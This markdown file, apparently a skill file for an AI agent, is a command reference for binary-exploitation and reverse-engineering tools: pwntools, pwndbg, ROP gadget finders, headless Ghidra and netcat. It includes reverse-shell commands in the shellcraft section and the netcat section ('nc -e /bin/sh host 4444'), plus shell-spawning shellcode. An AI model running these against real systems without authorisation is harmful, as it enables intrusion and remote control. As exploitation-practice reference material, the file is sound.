---
name: tool-usage
description: Security tool command reference
---

# Security Tool Reference

## pwntools

### Setup
```python
from pwn import *

context.arch = 'amd64'       # or 'i386'
context.os = 'linux'
context.log_level = 'debug'  # Verbose output
```

### Connections
```python
# Local process
p = process('./target')
p = process('./target', env={'VAR': 'value'})

# Remote
p = remote('host', port)

# GDB attachment
gdb.attach(p, '''
b *main
c
''')
```

### ELF Operations
```python
elf = ELF('./target')
libc = ELF('./libc.so.6')

# Addresses
elf.symbols['main']          # Function address
elf.plt['puts']              # PLT entry
elf.got['puts']              # GOT entry
next(elf.search(b'/bin/sh')) # Find string

# With PIE
elf.address = leaked_base    # Set base address
```

### ROP Building
```python
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')

# Get chain
payload = rop.chain()

# Find gadgets
rop.find_gadget(['pop rdi', 'ret'])
rop.find_gadget(['ret'])
```

### I/O Operations
```python
p.send(b'data')              # Send raw
p.sendline(b'data')          # Send with newline
p.sendafter(b':', b'data')   # Wait then send
p.sendlineafter(b':', b'data')

p.recv(100)                  # Receive N bytes
p.recvline()                 # Receive until newline
p.recvuntil(b'>')            # Receive until marker
p.recvall()                  # Receive until EOF

p.interactive()              # Interactive shell
```

### Packing/Unpacking
```python
p64(0x401234)                # Pack 64-bit
p32(0x401234)                # Pack 32-bit
u64(b'\x34\x12\x40\x00\x00\x00\x00\x00')  # Unpack
u32(b'\x34\x12\x40\x00')

# With padding
u64(leak.ljust(8, b'\x00'))
```

### Shellcraft
```python
# Generate shellcode
shellcode = asm(shellcraft.sh())                    # Spawn shell
shellcode = asm(shellcraft.cat('<filepath>'))       # Read file
shellcode = asm(shellcraft.connect('<host>', <port>) + shellcraft.dupsh())  # Reverse shell
```

## GDB/pwndbg

### Essential Commands
```
# Running
r                           # Run
r < input.txt               # Run with stdin
c                           # Continue
si / ni                     # Step into / over

# Breakpoints
b *main                     # Function
b *0x401234                 # Address
b *main+50                  # Offset
info b                      # List breakpoints
delete N                    # Delete breakpoint

# Examination
x/20gx $rsp                 # 20 qwords hex
x/20wx $rsp                 # 20 dwords hex
x/s 0x401234                # String
x/i $rip                    # Instruction

# Registers
info registers              # All
p $rax                      # Specific
set $rax = 0                # Modify
```

### pwndbg Specific
```
checksec                    # Security features
vmmap                       # Memory map
telescope $rsp 20           # Smart stack view
search -s "/bin/sh"         # Find string
search -p 0x401234          # Find pointer
cyclic 200                  # Generate pattern
cyclic -l 0x61616168        # Find offset
heap                        # Heap status
bins                        # Free list bins
```

## ropper / ROPgadget

### ropper
```bash
ropper --file target --search "pop rdi"
ropper --file target --search "pop rsi"
ropper --file target --search "ret"
ropper --file target --search "leave"
ropper --file target --search "syscall"
ropper --file target --search "mov [r"
```

### ROPgadget
```bash
ROPgadget --binary target
ROPgadget --binary target --only "pop|ret"
ROPgadget --binary target --ropchain
```

### one_gadget
```bash
one_gadget libc.so.6
# Shows constraints for each gadget
```

## Ghidra (Headless)

### Basic Analysis
```bash
analyzeHeadless /tmp/project MyProject \
    -import target \
    -postScript ExportDecompiled.py
```

### With pyghidra-mcp
```python
# List functions
mcp__pyghidra-mcp__search_functions_by_name("main")

# Decompile
mcp__pyghidra-mcp__decompile_function("main")

# Find strings
mcp__pyghidra-mcp__search_strings("password")

# Cross references
mcp__pyghidra-mcp__list_cross_references(0x401234)
```

## Network Tools

### netcat
```bash
nc -lvp 4444                 # Listen
nc host 4444                 # Connect
nc -e /bin/sh host 4444      # Reverse shell
```

### Wireshark/tcpdump
```bash
tcpdump -i eth0 -w capture.pcap
tcpdump -r capture.pcap
tcpdump -A port 80           # ASCII output
```
